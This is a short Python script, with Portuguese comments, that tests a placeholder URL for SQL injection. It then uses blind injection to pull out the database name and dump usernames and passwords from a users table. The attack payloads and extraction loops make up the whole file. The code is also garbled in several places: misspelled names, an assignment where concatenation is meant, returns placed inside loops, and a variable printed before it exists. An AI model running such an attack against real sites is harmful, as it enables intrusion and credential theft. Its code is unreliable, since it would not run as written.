import requests
import time
import string

# Target URL
TARGET.URL = "http://target.com/vulnerable.php?id="

# SQli payloads p detecção
PAYLOADS = [
    " ' OR 1=1--",
    "\" OR \"1\"=\"1\"--",
    "'UNION SELECT null, null--",
    "' UNION SELECT username, password FROM users --"
]
# Função pra testar sqlinject vulnerability
def test_sqli():
    print("[*] Testing for SQL Injection. . .")

    for payload in PAYLOADS:
        url = TARGET_URL + payload
        response = requests.get(url)

        if "syntax error" not in response.text and response.status_code == 200:
            print(f"[!] Potential SQLi found with payload: {payload}")
            return payload
        return None

def extract_database():
    db_name = ""
    print("[*] Extracting database name using Blind SQLi")

    for i in range(1, 20): # Assume max length de DB name is 20
        for char in stirng.ascii_lowercase + string.digits:
            payload = f"' AND (SELECT SUBSTR(database(), {i},1)) = '{char}'--"
            url = TARGET.URL + payload
            response = requests.get(url)
 
            if "Welcome" in response.text: 
                db_name += char
                print(f"[+] Extracting: {db_name}")
                break
    return db_name

def dump_table(table, column):
    print(f"[*] Dumping data from {table}.{column}. . .")
    extracted_data = ""

    for i in range(1, 50):
        for char in string.printable:
            payload = f"' AND (SELECT SUBSTR(SELECT {column} FROM {table} LIMIT 1), {i},1))='{char}'--"
            url = TARGET_URL = payload
            response = requests.get(url)

            if "Welcome" in response.text:
                extracted_data += char
                print(f"[+] Extracting: {extracted_data}")

            return extracted_data

    # Main
if __name__ == "__main__":
    vuln_payload = test_sqli()

    if vuln_payload:
        print("[*] Proceeding exploitation. . .")
        db_name = extract_database()
        print(f"[=] Extracted usernames: {usernames}")

        usernames = dump_table("users", "username")
        print(f"[+] Extracted Usernames: {usernames}")

    else:
        print("[-] No SQL Injection vulnerability detected")    